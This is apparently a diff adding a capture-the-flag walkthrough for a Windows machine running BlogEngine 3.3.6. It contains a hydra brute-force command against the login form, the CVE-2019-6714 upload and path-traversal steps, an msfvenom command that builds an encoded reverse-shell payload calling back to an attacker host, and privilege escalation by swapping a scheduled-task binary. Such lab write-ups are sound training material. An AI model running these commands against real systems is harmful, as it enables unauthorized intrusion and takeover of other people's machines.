@@ -1,0 +1,47 @@
+[+]
+Recon - NMAP scan
+{{
+	Found three ports open
+	1.80 - web server
+	2.3389 - ms-wbt-server >> RDP
+	3.5985 - Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+}}
+
+[+]
+Enumeration
+{{
+	Lets crack the login page found at seb server 80.
+	Use hydra to brute-force the login page:
+	[hydra -l admin -P rockyou.txt.gz 10.10.14.14 http-post-form '/Account/login.aspx:__VIEWSTATE=YYkpTrjVFTE%2BiGA1v3KG0ooCxx0Ji1uiifZK%2FdfdJ3U8%2FdznYKpPXxjxFU%2BOOjwlSR7Tzuq7VdrBSds2xh20Vb9UQpMBSttjsLdFEMkk1jBtDZ%2FdLpN1fBkpTZa11S5dLmeALO%2BcHLwb3fecWxcsDohKXr4zF4b37rcL5RYTFVuinbqL&__EVENTVALIDATION=Ttl6Ph2EbRC%2F%2FDP22elLMaTLkZXRFRHrvp2UvYW%2FEVtViL7ySjN%2FBiuVGvG%2FZ0m%2BlQWaLr%2FdbLvDUmv98wOLit1n7NTkL%2FUL%2B9cnnewriRtSxQoC52IYcIW5i0GEKTynozKfEtA4truhd0eLtiVVSA2L5wG%2F%2BNrXjQXfbVN7absOeEBP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed']
+	username : admin
+	password : 1qaz2wsx
+}}
+
+[+]
+Exploitation
+{{
+	After logging into the server find the version blogengine >> 3.3.6
+	Search for vulnerability >> [searchsploit blogengine 3.3.6] >> found CVE-2019-6714
+	After further enumeration of the exploit >> Follow the below steps
+	1.Download the exploit and change the LHOST and LPORT as attack host.
+	2.Change the name of the file to PostView.ascx.
+	3.Try to edit the post and there you can find File Manager icon >> Click it and upload the file.
+	4.After that go to >> 10.10.250.246/?theme=../../App_Data/files >> start listener before this.
+	***Win***
+	Lets convert the shell to meterpreter...
+	Create payload to reverse shell[msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o payload.exe]
+	1.Use msfconsole > exploit/multi/handler
+	2.set payload windows/meterpreter/reverse_tcp
+	3.run 
+	run >> **WIN**
+}}
+[+]
+Provilege Escalation
+{{
+	Upload winPEAS and run it.
+	Found WindowsScheduler
+	Lets go to the Program Files Directory
+	check the logs in the Event Folder of Scheduler Process
+	Replace the Message.exe file with payload.exe and start the listener
+	***GOT Administrator Privilege*** 
+}}
